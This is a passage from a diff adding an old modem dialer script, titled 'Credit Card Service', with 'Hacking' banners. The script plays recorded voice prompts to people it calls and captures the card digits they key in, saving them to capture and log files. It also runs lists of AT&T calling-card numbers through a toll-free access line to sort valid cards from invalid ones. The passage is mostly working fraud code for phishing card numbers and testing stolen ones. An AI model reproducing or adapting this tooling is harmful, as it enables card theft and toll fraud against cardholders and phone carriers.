+ Print Local " Playing "Comment02$
+ execute Player$ + Module02$
+Endif
+Loop = 1
+RLoop = 0
+T$=""
+VAR$=""
+
+WaitMenu:
+VAR$=T$
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+PRINT LOCAL " [33m Hacking : [0m" A$+ver$,ASD1$
+Print Local
+Print Local " -*- Card Collect Control Menu -*-"
+Print Local
+IF Z$ == "0"
+ Print Local "Press [33m-[0m +[33m -[0m Skip Next Call     [0m"
+ Print Local "Press [33m-[0m -[33m -[0m Return ManualMenu  [0m"
+ELSE
+ Print Local "Press [33m-[0m /[33m -[0m To Save Digits     [0m"
+ Print Local "Press [33m-[0m -[33m -[0m Return ManualMenu  [0m"
+ENDIF
+Print Local "Capture - Filename   >:"Cards$+A$
+Print Local "Card Digits Incoming >:",T$
+
+	WHEN	1 "1" Goto P1
+	WHEN	2 "2" Goto P2
+	WHEN	3 "3" Goto P3
+	WHEN	4 "4" Goto P4
+	WHEN	5 "5" Goto P5
+	WHEN	6 "6" Goto P6
+	WHEN	7 "7" Goto P7
+	WHEN	8 "8" Goto P8
+	WHEN	9 "9" Goto P9
+	WHEN	10 "0" Goto P0
+	WHEN	11 "+" Goto SKIP
+	WHEN	12 "/" Goto COLLECTED
+	WHEN	13 "-" Goto RMM
+	WHEN	14 "d" Goto waitmenu
+	WAIT	15
+	IF Z$ == "0"
+	GOTO	PREDIAL
+	ELSE
+	GOTO	WaitMenu
+	ENDIF
+
+end
+
+
+P0:
+S$="0"
+	T$=VAR$+S$
+IF Z$ == "0"
+  IF      Loop >= Count
+   Loop = Loop + 1
+   GOTO    ADDITIONAL
+  endif
+Loop = Loop + 1
+ENDIF
+Goto Waitmenu
+
+P1:
+S$="1"
+	T$=VAR$+S$
+IF Z$ == "0"
+  IF      Loop >= Count
+   Loop = Loop + 1
+   GOTO    ADDITIONAL
+  endif
+Loop = Loop + 1
+ENDIF
+Goto Waitmenu
+
+P2:
+S$="2"
+	T$=VAR$+S$
+IF Z$ == "0"
+  IF      Loop >= Count
+   Loop = Loop + 1
+   GOTO    ADDITIONAL
+  endif
+Loop = Loop + 1
+ENDIF
+Goto Waitmenu
+
+P3:
+S$="3"
+	T$=VAR$+S$
+IF Z$ == "0"
+  IF      Loop >= Count
+   Loop = Loop + 1
+   GOTO    ADDITIONAL
+  endif
+Loop = Loop + 1
+ENDIF
+Goto Waitmenu
+
+P4:
+S$="4"
+	T$=VAR$+S$
+IF Z$ == "0"
+  IF      Loop >= Count
+   Loop = Loop + 1
+   GOTO    ADDITIONAL
+  endif
+Loop = Loop + 1
+ENDIF
+Goto Waitmenu
+
+P5:
+S$="5"
+	T$=VAR$+S$
+IF Z$ == "0"
+  IF      Loop >= Count
+   Loop = Loop + 1
+   GOTO    ADDITIONAL
+  endif
+Loop = Loop + 1
+ENDIF
+Goto Waitmenu
+
+P6:
+S$="6"
+	T$=VAR$+S$
+IF Z$ == "0"
+  IF      Loop >= Count
+   Loop = Loop + 1
+   GOTO    ADDITIONAL
+  endif
+Loop = Loop + 1
+ENDIF
+Goto Waitmenu
+
+P7:
+S$="7"
+	T$=VAR$+S$
+IF Z$ == "0"
+  IF      Loop >= Count
+   Loop = Loop + 1
+   GOTO    ADDITIONAL
+  endif
+Loop = Loop + 1
+ENDIF
+Goto Waitmenu
+
+P8:
+S$="8"
+	T$=VAR$+S$
+IF Z$ == "0"
+  IF      Loop >= Count
+   Loop = Loop + 1
+   GOTO    ADDITIONAL
+  endif
+Loop = Loop + 1
+ENDIF
+Goto Waitmenu
+
+P9:
+S$="9"
+	T$=VAR$+S$
+IF Z$ == "0"
+  IF      Loop >= Count
+   Loop = Loop + 1
+   GOTO    ADDITIONAL
+  endif
+Loop = Loop + 1
+ENDIF
+Goto Waitmenu
+
+
+Additional:
+VAR$=T$
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+PRINT LOCAL " [33m Hacking : [0m" A$+ver$,ASD1$
+Print Local
+Print Local " -*- Card Collect Control Menu -*- Additional Digits -*-"
+Print Local
+IF Z$ == "0"
+ Print Local "Press [33m-[0m +[33m -[0m Skip Next Call     [0m"
+ Print Local "Press [33m-[0m -[33m -[0m Return ManualMenu  [0m"
+ELSE
+ Print Local "Press [33m-[0m /[33m -[0m To Save Digits     [0m"
+ Print Local "Press [33m-[0m -[33m -[0m Return ManualMenu  [0m"
+ENDIF
+Print Local "Capture - Filename   >:"Cards$+A$
+Print Local "Card Digits Incoming >:"T$
+
+	WHEN	1 "1" Goto P1
+	WHEN	2 "2" Goto P2
+	WHEN	3 "3" Goto P3
+	WHEN	4 "4" Goto P4
+	WHEN	5 "5" Goto P5
+	WHEN	6 "6" Goto P6
+	WHEN	7 "7" Goto P7
+	WHEN	8 "8" Goto P8
+	WHEN	9 "9" Goto P9
+	WHEN	10 "0" Goto P0
+	WHEN	11 "+" Goto SKIP
+	WHEN	12 "/" Goto COLLECTED
+	WHEN	13 "-" Goto RMM
+	WAIT	12
+	GOTO	Collected
+end
+
+
+Collected:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+PRINT LOCAL "[33mPhoneNumber Hacked >: [0m" A$+ver$
+Print Local
+Print Local " -*- Card Collect Control Menu -*-"
+Print Local
+Print Local "Capture - Path+Filename   >:"Cards$+A$
+IF Z$ == "0"
+ Print Local loop " Card Digits Dialed  >:"T$
+ENDIF
+
+IF Cards$ != ""
+  CCards$=Cards$+A$
+   If Exists (CCards$)
+     open Append 1, CCards$
+     write	#1, T$
+     Close #1
+    else 
+     open OutPut 1, CCards$
+     write	#1, T$
+     Close #1
+   endif
+endif
+
+IF TL$ != ""
+   If Exists (TL$)
+     open Append 1, TL$
+     write	#1, T$
+     Close #1
+    else 
+     open OutPut 1, TL$
+     write	#1, T$
+     Close #1
+   endif
+endif
+
+Loop = 0
+Print Local "\nPlaying "Comment04$
+execute Player$ + Module04$
+DTemp$ = Date$ + "  " + Time$
+IF GL$ != ""
+GGL$=GL$+A$
+ if exists (GGL$)
+ OPEN	APPEND 1,GGL$
+  write #1  DTemp$
+  write #1, "TelePhone Card " T$ "Number Dialed" A$+ver$
+  write	#1 "******************"
+ CLOSE	#1
+ else
+ OPEN	OUTPUT 1,GGL$
+  write	#1 "******************"
+  write #1  DTemp$
+  write #1, "TelePhone Card " T$ "Number Dialed" A$+ver$
+  write	#1 "******************"
+ CLOSE	#1
+ endif
+Endif
+
+DTemp$ = Date$ + "  " + Time$
+IF CF$ == "Y"
+ if exists (TCF$)
+ OPEN	APPEND 1,TCF$
+  write #1  DTemp$
+  write #1, "TelePhone Card " T$ "Number Dialed" A$+ver$
+  write	#1 "******************"
+ CLOSE	#1
+ else
+ OPEN	OUTPUT 1,TCF$
+  write	#1 "******************"
+  write #1  DTemp$
+  write #1, "TelePhone Card " T$ "Number Dialed" A$+ver$
+  write	#1 "******************"
+ CLOSE	#1
+ endif
+Endif
+
+IF Z$ == "0"
+/*automatic */
+If MM1$=="Y"
+	CLS
+	 PAUSE 2
+	 Print Local "                                                    ###"
+	 Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+	 Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+	 Print Local
+	 PRINT LOCAL " [33m Hacking : [0m" A$+ver$,ASD1$
+	 Print Local
+	 Print Local " Playing (* To skip delay) "Comment05$
+	wait 2 "*"
+	execute Player$ + Module05$
+Endif
+If MM2$=="Y"
+	CLS
+	 Print Local "                                                    ###"
+	 Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+	 Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+	 Print Local
+	 PRINT LOCAL " [33m Hacking : [0m" A$+ver$,ASD1$
+	 Print Local
+	 Print Local " Playing (* To skip delay) "Comment06$
+	wait 5 "*"
+	execute Player$ + Module06$
+Endif
+If MM3$=="Y"
+	CLS
+	 PAUSE 1
+	 Print Local "                                                    ###"
+	 Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+	 Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+	 Print Local
+	 PRINT LOCAL " [33m Hacking : [0m" A$+ver$,ASD1$
+	 Print Local
+	 Print Local " Playing (* To skip delay) "Comment08$
+	wait 5 "*"
+	execute Player$ + Module08$
+Endif
+	Pause 15
+/*automatic */
+EndIf
+
+send "^M"
+wait 2 "OK"
+send "ATE0^M"
+wait 2 "OK"
+IF Z$ == "0"
+ Gosub Skip
+endif
+GOTO ManualMenu
+
+PREDIAL:
+If T$==""
+ LOOP = 1
+ RLoop = RLoop + 1
+  IF      RLoop >= 3
+   GOTO SKIP
+  Endif
+ execute Player$ + Module02$
+ Goto WaitMenu
+Endif
+
+LOOP = 1
+RLoop = RLoop + 1
+IF      RLoop >= 3
+ GOTO SKIP
+Endif
+execute Player$ + Module03$
+T$ = ""
+Goto WaitMenu
+
+RMM:
+Print Local
+send "ATE0^M"
+wait 3 "OK"
+LOOP = 0
+S$=""
+T$ = ""
+VAR$=""
+Goto ManualMenu
+
+SKIP:
+
+If G$=="8"
+ Goto MainMenu
+Endif
+
+RING = 0
+PU$="A C T I V E"
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local 
+Print Local " Resetting Modem For Next Call ...."
+IF BL$ != ""
+BBL$=BL$+A$
+DTemp$ = Date$ + "  " + Time$
+ if exists (BBL$)
+   OPEN	APPEND 1,BBL$
+   WRITE	#1 "******************"
+   write 	#1 DTemp$
+   WRITE	#1 A$+ver$,T$
+   WRITE	#1 
+   CLOSE	#1
+ else
+   OPEN	OUTPUT 1,BBL$
+   WRITE	#1 "******************"
+   write 	#1 DTemp$
+   WRITE	#1 A$+ver$,T$
+   WRITE	#1 
+   CLOSE	#1
+ endif
+Endif
+T$=""
+send "~~~AT^M"
+wait 10 "OK"
+send "~~~ATH0^M"
+wait 10 "OK"
+/*send "~~~ATX5E1^M"*/
+send "ATZ^M"
+wait 10 "OK"
+Goto Dialer
+RETURN
+
+ABORT:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local 
+Print Local " ABORTED ! Resetting Modem For Next Call ...."
+Close #99
+send "~~~ATH0^M"
+Wait 5 "OK"
+send "~~~ATE1^M"
+Wait 5 "OK"
+DLS$="N"
+PU$="A C T I V E"
+CF$="N"
+HT$="--:--:--"
+HH$="--:--:--"
+ST$="--:--:--"
+ET$="--:--:--"
+
+Goto Mainmenu
+
+AreaCheck:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- AreaCheck Control Menu -*-"
+Print Local
+Print Local "[33mAreaCode Digits........... [0m>: " A$
+Print Local "[33mCurrent Area Time..........[0m>: "timeh$+":"+timem$+":00"
+Print Local
+Print Local "[33mAreaCode State............ [0m>: " ASD1$
+Print Local
+Print Local ASD2$
+Print Local
+INPUT LOCAL "[33mAreaCode[0m (3 Digits/?)..... [0m>: ",A$
+
+IF A$ == ""
+	 open input 1, "ENV:Dialer00.prefs"
+	 read #1, A$
+	 CLOSE #1
+	 ASD1$ = ""
+	 ASD2$ = ""
+	 Goto MainMenu
+endif
+
+IF A$ == "?"
+CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ Print Local " -*- AreaCheck Control Menu -*-"
+ Print Local
+ Print Local "125 201 202 203 204 205 206 207 208 209 210 212 213 214 215 216"
+ Print Local "217 218 219 240 242 248 250 253 254 264 268 281 302 303 304 305"
+ Print Local "306 307 308 309 310 312 313 314 315 316 317 318 319 320 330 334"
+ Print Local "340 345 352 360 401 402 403 404 405 406 407 408 409 412 413 414"
+ Print Local "415 416 417 418 419 423 425 440 441 443 473 501 502 503 504 505"
+ Print Local "506 507 508 509 510 512 513 514 515 516 517 518 519 520 540 541"
+ Print Local "561 562 573 601 602 603 604 605 606 607 608 609 610 612 613 614"
+ Print Local "615 616 617 618 619 626 630 649 650 664 670 671 701 702 703 704"
+ Print Local "705 706 707 708 709 712 713 714 715 716 717 718 719 732 757 758"
+ Print Local "760 765 770 773 787 800 801 802 803 804 805 806 807 808 809 810"
+ Print Local "812 813 814 815 816 817 818 819 830 847 850 860 864 867 868 869"
+ Print Local "870 876 888 900 901 902 903 904 905 906 907 908 909 910 912 913"
+ Print Local "914 915 916 917 918 919 920 937 940 941 954 956 970 972 973"
+ Print Local
+Ask "Please Press Return ...",P$
+ Goto AreaCheck
+endif
+   Gosub Check
+Goto AreaCheck
+END
+
+ModemInit:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local 
+Print Local " Loading Modem Prefs ..."
+pause 1
+Send "~~~ATZ^M"
+Wait 5 "OK"
+send "~~~"
+send Temp$
+Wait 5 "OK"
+
+IF EXISTS("ENV:Dialer02.prefs")
+  open input 1, "ENV:Dialer02.prefs"
+  read #1, DV$
+  read #1, SL$
+  read #1, GS$
+  Close #1
+ELSE
+  open output 1, "ENV:Dialer02.prefs"
+  Write #1, "100"
+  Write #1, "2"
+  Write #1, "1"
+  Close #1
+  open output 2, "ENVARC:Dialer02.prefs"
+  Write #2, "100"
+  Write #2, "2"
+  Write #2, "1"
+  Close #2
+Goto Modeminit
+Endif
+
+SVG$="AT#VGR="			/*Default Voice Settings*/
+RVG$="^M"
+VGR$=SVG$+DV$+RVG$
+
+ALR$="ATL"			/*Default Voice Settings*/
+MLR$=ALR$+SL$+RVG$
+
+GALR$="ATM"			/*Default Voice Settings*/
+GMLR$=GALR$+GS$+RVG$
+Return
+
+MANUALCALL:
+
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$"  [0m     [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- Control Menu -*-                 "
+Print Local
+PRINT LOCAL " [33m Phone Number.........: [0m" AA$
+Print Local " [33m CurrentCard Digits...: [0m" AB$
+Print Local " [33m AT&T FileList........: [0m" LS$
+Print Local " [33m Valid FileList.......: [0m" GCards$
+Print Local " [33m INValid FileList.....: [0m" BCards$
+
+Print Local " [33m----------------------------------------------------------[0m  "PU$
+Print Local
+Print Local " [33m- [0m1[33m -[0m AT&T Card     [33m- [0m5[33m -[0m AreaInfo      [33m- [0mI[33m -[0m ModemInit"
+Print Local " [33m- [0m2[33m -[0m PhoneNumber   [33m- [0m6[33m -[0m Hangup        [33m- [0mC[33m -[0m Modem Connect"
+Print Local " [33m- [0m3[33m -[0m CALL !        [33m- [0m7[33m -[0m VOICE ON  !   [33m- [0mX[33m -[0m Exp Date Add On(Inactive)"
+Print Local " [33m- [0m4[33m -[0m MainMenu !    [33m- [0m8[33m -[0m VOICE OFF !"
+Print Local
+Print Local " [33m- [0m*[33m -[0m Test List !  [33m- [0mL[33m -[0m Save List !"
+Print Local
+ASK Local "Please Select Function (0-9,A,E) >: ", G$
+	G$ = LOWER$(G$)
+
+	If G$=="1"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mCard[0m....... >: ",AB$
+	  goto ManualCall
+	Endif
+	If G$=="2"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mNumber[0m..... >: ",AA$
+	  goto ManualCall
+	Endif
+	If G$=="3"
+	  gosub ManualCallDial
+	Endif
+	If G$=="4"
+	send "~~~AT^M"
+	wait 10 "OK"
+	send "~~~ATH0^M"
+	wait 10 "OK"
+	send "~~~ATE1^M"
+	wait 10 "OK"
+        goto MainMenu
+	Endif
+	If G$=="5"
+	 Goto AreaCode
+	Endif
+	If G$=="6"
+	send "~~~AT^M"
+	wait 10 "OK"
+	send "~~~ATH0^M"
+	wait 10 "OK"
+	send "~~~ATE1^M"
+	wait 10 "OK"
+	goto ManualCall
+	Endif
+
+	If G$=="7"
+	send "at#cls=8^M"
+	wait 3 "OK"
+	send "at#vls=6^M"
+	wait 3 "VCON"
+	send "AT#VGT=128^M"
+	wait 3 "OK"
+	Endif
+
+	If G$=="8"
+	send "at#cls=8^M"
+	wait 3 "OK"
+	send "at#vls=6^M"
+	wait 3 "VCON"
+	send "AT#VGT=0^M"
+	wait 3 "OK"
+	Endif
+
+	If G$=="*"
+	  Print Local
+	  Print Local 
+	  ASK LOCAL "[33mManual/Automatic Test[0m..(M/A).>: ",CH$
+	   CH$ = LOWER$(CH$)
+	   If CH$==""
+	    CH$="a"
+	   Endif
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mCardList FileName[0m.(Path+File)>: ",LS$
+	   If exists (LS$)
+             Open input 98,LS$
+	     goto Manualcalltest
+	   else
+	     BEEP
+	     Print Local ;"INVALID FILENAME !"
+	     Pause 1
+	     LS$=""
+	     gosub manualCALL
+	   Endif
+	Endif
+
+	If G$=="x"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mExp. Month Start[0m....... >: ",EXM$
+          INPUT LOCAL "[33mExp. Year Start [0m....... >: ",EXY$
+	  EX$="Y"
+          goto manualcall
+	Endif
+
+	If G$=="l"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mValid Card(s) FileName[0m....... >: ",GCards$
+		If GCards$==""
+		 GCards$="Ram:Valid_AT&T"
+		EndIf
+          INPUT LOCAL "[33mINValid Card(s) FileName[0m..... >: ",BCards$
+		If BCards$==""
+		 BCards$="Ram:INValid_AT&T"
+		EndIf
+          goto manualcall
+	Endif
+	If G$=="i"
+	  gosub ModemInit
+	Endif
+	If G$=="c"
+	  Send "ATD^M"
+	Endif
+
+Goto ManualCall
+END
+
+TESTMENU:
+
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$"  [0m     [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- Control Menu -*-                 "
+Print Local
+PRINT LOCAL " [33m Phone Number...........: [0m" AA$
+Print Local " [33m Current Card Digits....: [0m" AB$
+Print Local " [33m AT&T Test FileList.....: [0m" LS$
+PRINT LOCAL " [33m Valid AT&T FileName....: [0m" GCards$
+Print Local " [33m INValid AT&T FileName..: [0m" BCards$
+Print Local " [33m Valid Cards............: [0m" GC
+Print Local " [33m INValid Cards..........: [0m" BC
+Print Local " [33m Tested Cards...........: [0m" TC
+Print Local " [33m----------------------------------------------------------[0m  "PU$
+Print Local
+
+If CH$=="a"
+	send "ATD^M"
+	Print Local "Press Return If not Valid or HOLD"
+		WHEN	1 "CONNECT"     Goto GC1
+		WHEN	2 "NO CARRIER"  Goto BC1
+		WAIT	40
+		  send "^M"
+		  send "ATE1^M"
+		  wait 2 "OK"
+		GOTO	ManualCallTest
+else
+	Print Local " [33m- [0m1[33m -[0m Confirm AT&T Card    [33m- [0m3[33m -[0m STOP TESTING "
+	Print Local " [33m- [0m2[33m -[0m Discard AT&T Card    [33m- [0m4[33m -[0m QUIT         "
+	Print Local
+	INPUT Local "Please Select Function (0-9,A,E) >: ", G$
+	If G$==""
+	send "~~~AT^M"
+	wait 10 "OK"
+	send "~~~ATH0^M"
+	wait 10 "OK"
+	 Goto BC1
+	Endif
+	If G$=="1"
+	send "~~~AT^M"
+	wait 10 "OK"
+	send "~~~ATH0^M"
+	wait 10 "OK"
+	 Goto GC1
+	Endif
+	If G$=="2"
+	send "~~~AT^M"
+	wait 10 "OK"
+	send "~~~ATH0^M"
+	wait 10 "OK"
+	 Goto BC1
+	Endif
+	If G$=="3"
+	send "~~~AT^M"
+	wait 10 "OK"
+	send "~~~ATH0^M"
+	wait 10 "OK"
+	 Goto TC1
+	Endif
+	If G$=="4"
+	send "~~~AT^M"
+	wait 10 "OK"
+	send "~~~ATH0^M"
+	wait 10 "OK"
+	 Goto CLOSEIT
+	Endif
+	Goto TestMenu
+ENDif
+
+GC1:
+	GC=GC+1
+	TC=TC+1
+	If Exists (GCards$)
+	  open Append 1, GCards$
+	  write	#1, AB$
+	  Close #1
+	 else 
+	  open OutPut 1, GCards$
+	  write	#1, AB$
+	  Close #1
+	endif
+
+	If Exists (TCards$)
+	  open Append 1, TCards$
+	  write	#1, AB$
+	  Close #1
+	 else 
+	  open OutPut 1, TCards$
+	  write	#1, AB$
+	  Close #1
+	endif
+
+	  send "^M"
+	  ONCARRIER
+	  HANGUP
+	goto ManualCallTEST
+END
+
+BC1:
+	BC=BC+1
+	TC=TC+1
+	 If Exists (BCards$)
+	  open Append 1, BCards$
+	  write	#1, AB$
+	  Close #1
+	 else 
+	  open OutPut 1, BCards$
+	  write	#1, AB$
+	  Close #1
+	 endif
+
+	If Exists (TCards$)
+	  open Append 1, TCards$
+	  write	#1, AB$
+	  Close #1
+	 else 
+	  open OutPut 1, TCards$
+	  write	#1, AB$
+	  Close #1
+	endif
+
+	  send "^M"
+	  send "~~~ATZ^M"
+	  wait 10 "OK"
+	 goto ManualCallTEST
+END
+
+TC1:
+	If G$=="3"
+	  CLOSE #98
+	  send "^M"
+	  send "~~~ATH0E1^M"
+	  wait 10 "OK"
+          goto ManualCallResult
+	Endif
+END
+
+
+MANUALCALLRESULT:
+
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$"  [0m     [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- Control Menu -*-                 "
+Print Local
+PRINT LOCAL " [33m Phone Number.........: [0m" AA$
+Print Local " [33m CurrentCard Digits...: [0m" AB$
+Print Local " [33m AT&T FileList........: [0m" LS$
+Print Local " [33m Valid FileList.......: [0m" GCards$
+Print Local " [33m INValid FileList.....: [0m" BCards$
+Print Local " [33m Valid Cards..........: [0m" GC
+Print Local " [33m INValid Cards........: [0m" BC
+Print Local " [33m Tested Cards.........: [0m" TC
+GC=0
+TC=0
+BC=0
+Print Local
+ALARM
+ASK LOCAL "  Press Return ...",P$
+Goto ManualCall
+END
+
+MANUALCALLTEST:
+    READ #98, AB$
+	IF AB$ == "END_OF_FILE"
+	 Close #98
+         GOTO MANUALCALLRESULT
+	ENDIF
+    GOsub ManualCallDial
+	send "ATE1^M"
+	wait 3 "OK"	
+    GOto TestMenu
+END
+
+ManualCallDial:
+If AA$==""
+ CLOSE #98
+ Goto ManualCALL
+endif
+If AB$==""
+ CLOSE #98
+ Goto ManualCALL
+endif
+
+ Send "~~~ATX0&A0E0^M"
+ Wait 3 "OK"
+ CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ Print Local " -*- Dialer Sequence RTN -*-"
+ print local
+ ASD1$ == ""
+PRINT LOCAL
+PRINT LOCAL  "[33mNow Dialing : [0m" AA$
+PRINT LOCAL  "[33mAT&T Card   : [0m" AB$
+
+send prefix1$
+send tollfree$
+send ";"
+send "^M"
+wait 30 "OK"
+print local "  [33mDialing [0m"tollfree$;
+Loop = 0
+LoopAA:
+	pause 1
+	Loop = Loop + 1
+	IF	Loop < A1
+		PRINT	LOCAL ".";
+	GOTO	LoopAA
+	endif
+send prefix2$
+send AA$
+send ";"
+send "^M"
+wait 20 "OK"
+print local "  [33mDialing [0m "AA$ "[0m ";
+Loop = 0
+LoopAB:
+	pause 1
+	Loop = Loop + 1
+	IF	Loop < A5
+		PRINT LOCAL ".";
+	GOTO	LoopAB
+	Loop = 0
+	endif
+send prefix2$
+send AB$
+send ";"
+send "^M"
+wait 20 "OK"
+print local "  [33mAT&T Card[0m ...";
+Pause 2
+RETURN
+
+LOGS:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$"  [0m     [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- View Logs Menu -*-                 "
+Print Local
+PRINT LOCAL " [33m- [0m1[33m -[0m [33m Areacode Card(S).....: [0m" Cards$
+Print Local " [33m- [0m2[33m -[0m [33m AT&T TotalFileList...: [0m" TL$
+Print Local " [33m- [0m3[33m -[0m [33m Bad Log Areacode(s)..: [0m" GL$
+Print Local " [33m- [0m4[33m -[0m [33m Good Log Areacode(s).: [0m" BL$
+Print Local " [33m- [0m5[33m -[0m [33m External Editor......: [0m" Editor$
+Print local
+ASK Local "Please Select Function (0-4) >: ", L$
+	L$ = LOWER$(L$)
+
+	If L$=="1"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mValid AreaCode[0m....... >: ",ARCD$
+		If ARCD$==""
+		 GOTO LOGS
+		EndIf
+		IF EXISTS (Cards$+ARCD$)
+		Print Local " Loading File ..."
+		Execute Editor$+SP$+Cards$+ARCD$
+		goto LOGS
+		Else
+		Print Local " Missing File ..."
+		pause 2
+		goto LOGS
+		Endif
+	Endif
+
+	If L$=="2"
+	  Print Local
+	  Print Local
+		IF EXISTS (TL$)
+		Print Local " Loading File ..."
+		Execute Editor$+SP$+TL$
+		goto LOGS
+		Else
+		Print Local " Missing File ..."
+		pause 2
+		goto LOGS
+		Endif
+	Endif
+
+	If L$=="3"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mValid AreaCode[0m....... >: ",ARCD$
+		If ARCD$==""
+		 GOTO LOGS
+		EndIf
+		IF EXISTS (GL$+ARCD$)
+		Print Local " Loading File ..."
+		Execute Editor$+SP$+GL$+ARCD$
+		goto LOGS
+		Else
+		Print Local " Missing File ..."
+		pause 2
+		goto LOGS
+		Endif
+	Endif
+
+	If L$=="4"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mValid AreaCode[0m....... >: ",ARCD$
+		If ARCD$==""
+		 GOTO LOGS
+		EndIf
+		IF EXISTS (BL$+ARCD$)
+		Print Local " Loading File ..."
+		Execute Editor$+SP$+BL$+ARCD$
+		goto LOGS
+		Else
+		Print Local " Missing File ..."
+		pause 2
+		goto LOGS
+		endif
+	Endif
+
+	If L$=="5"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mFull Path+Editor FileName [0m....... >: ",TEditor$
+		If TEditor$==""
+		 GOTO LOGS
+		EndIf
+		IF EXISTS (TEditor$)
+		Editor$=TEditor$
+		Print Local " Loading File ..."
+		goto LOGS
+		Else
+		Print Local " Missing File ..."
+		pause 2
+		goto LOGS
+		Endif
+	Endif
+
+	If L$==""
+	 Goto MainMenu
+	Endif
+Goto MainMenu
+END
+
+ENDLESS:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- ENDLESS Control Menu -*-"
+Print Local
+Print Local "[33m Selected.....[0m>: "C
+Print Local "[33m MAX Calls....[0m>: "MC
+Print Local "[33m Start Time...[0m>: "ST$
+Print Local "[33m End Time.....[0m>: "ET$
+Print Local
+Print Local "[33m * [0mMax Call([33ms[0m)[33m. [33m + [0mStart Time([33ms[0m)[33m.[0m [33m - [0mEnd Time([33ms[0m)[33m.[0m"
+Print Local
+Print Local
+ASK LOCAL "[33mSelect Input[0m ..... >: ",I$
+	I$ = LOWER$(I$)
+	if I$=="*"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mMax Calls[0m....... >: ",MC
+	  Goto Endless
+	endif
+	if I$=="+"
+	CLS
+	Print Local "                                                    ###"
+	Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+	Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+	Print Local
+	Print Local " -*- Timing START Control Menu -*-"
+	Print Local
